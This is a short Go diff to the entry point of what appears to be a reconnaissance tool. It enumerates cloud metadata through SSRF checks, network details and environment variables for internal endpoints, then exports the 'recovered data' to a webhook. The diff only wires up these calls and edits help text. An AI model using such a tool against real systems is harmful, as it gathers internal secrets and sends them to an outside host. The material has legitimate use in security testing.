@@ -15,8 +15,8 @@ var (
 	noEnv   = flag.Bool("no-env", false, "Disables enumerating envvars for internal endpoints")
 
 	cloudMeta = flag.String("cloud", "", "Sets a specific cloud provider to do SSRF checks for")
-	webhook   = flag.String("webook", "", "Webhook endpoint to retrieve recovered data")
-	help      = flag.Bool("help", false, "display this help screen")
+	webhook   = flag.String("webook", "", "Webhook endpoint to push recovered data to")
+	help      = flag.Bool("help", false, "Display this help screen")
 )
 
 func main() {
@@ -29,12 +29,17 @@ func main() {
 	enum := sneak.StartEnum()
 	if !*noCloud {
 		fmt.Println("Enumerating cloud")
+		if err := enum.CheckCloud(cloudMeta); err != nil {
+			fmt.Println(err)
+		}
 	}
 	if !*noNet {
 		fmt.Println("Enumerating net")
+		enum.CheckNet()
 	}
 	if !*noEnv {
 		fmt.Println("Enumerating envs")
+		enum.CheckEnv()
 	}
 	enum.Export(webhook)
 }
